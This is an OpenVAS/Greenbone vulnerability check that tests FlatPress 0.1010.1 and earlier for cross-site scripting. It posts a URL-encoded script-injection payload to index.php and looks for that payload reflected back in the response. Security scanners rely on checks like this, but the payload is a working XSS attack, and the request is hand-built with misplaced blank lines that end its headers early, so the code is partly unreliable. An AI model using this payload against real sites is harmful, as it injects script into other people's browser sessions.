# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:flatpress:flatpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801947");
  script_version("2022-02-23T09:50:04+0000");
  script_tag(name:"last_modification", value:"2022-02-23 09:50:04 +0000 (Wed, 23 Feb 2022)");
  script_tag(name:"creation_date", value:"2011-07-13 17:31:13 +0200 (Wed, 13 Jul 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("FlatPress < 0.1010.2 XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_flatpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("flatpress/http/detected");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/102807/FlatPress-0.1010.1-Cross-Site-Scripting.html");

  script_tag(name:"summary", value:"FlatPress is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected website.");

  script_tag(name:"affected", value:"FlatPress version 0.1010.1 and prior.");

  script_tag(name:"insight", value:"The flaw is due to input passed to 'name', 'email' and 'url'
  POST parameters in index.php which is not properly sanitised before returning to the user.");

  script_tag(name:"solution", value:"Update to version 0.1010.2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

useragent = http_get_user_agent();
host = http_host_name(port: port);

url = dir + "/index.php?x=entry:entry110603-123922;comments:1";
data = "name=%22%3E%3Cscript%3Ealert%28%22VT-XSS-TEST%22%29%3B%3C%2Fscript%3E";

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n\r\n",
             "Content-Length: ", strlen(data), "\r\n",
             data);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && '><script>alert("VT-XSS-TEST");</script>' >< res) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
